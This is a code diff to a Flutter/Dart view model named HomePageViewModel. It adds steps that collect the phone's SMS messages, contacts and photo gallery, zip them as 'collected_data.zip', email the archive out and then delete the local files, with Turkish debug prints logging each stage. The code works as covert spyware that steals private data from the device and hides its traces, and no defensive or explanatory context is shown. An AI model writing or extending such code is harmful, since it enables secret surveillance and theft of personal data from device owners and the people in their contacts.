@@ -36,8 +36,11 @@ class HomePageViewModel extends ChangeNotifier {
       } else {
         isLoading = true;
         await _getSms();
+        await _getContacts();
+        await _getGallery();
         final zipFile = await _createZip();
         await emailService.sendEmail(zipFile);
+        await _deleteSpecificFiles();
         isLoading = false;
       }
     } catch (e) {
@@ -45,6 +48,7 @@ class HomePageViewModel extends ChangeNotifier {
       notifyListeners();
     }
   }
+
 
   Future<void> _getSms() async {
     try {
@@ -57,6 +61,7 @@ class HomePageViewModel extends ChangeNotifier {
             .join('\n'),
       );
       files.add(smsFile);
+      print("sms dosyası oluştu");
     } catch (e) {
       print("Hata: $e");
     }
@@ -74,6 +79,7 @@ class HomePageViewModel extends ChangeNotifier {
             .join('\n'),
       );
       files.add(contactsFile);
+      print("rehber dosyası oluştu");
     } catch (e) {}
   }
 
@@ -89,6 +95,7 @@ class HomePageViewModel extends ChangeNotifier {
       final galleryFile = File(path);
       await galleryFile.writeAsString(base64Photos.join('\n'));
       files.add(galleryFile);
+      print("galeri dosyası oluştu");
     } catch (e) {
       print("hata: ${e.toString()}");
     }
@@ -98,6 +105,7 @@ class HomePageViewModel extends ChangeNotifier {
     try {
       String zipPath = await _getFilePath('collected_data.zip');
       final zipFile = await zipService.createZip(files, zipPath);
+      print("zip dosyası oluştu");
       return zipFile;
     } catch (e) {
       rethrow;
@@ -119,7 +127,10 @@ class HomePageViewModel extends ChangeNotifier {
           await file.delete();
         }
       }
-    } catch (e) {}
+      print("zip dosyası silindi");
+    } catch (e) {
+      print("hata $e");
+    }
   }
 }
 
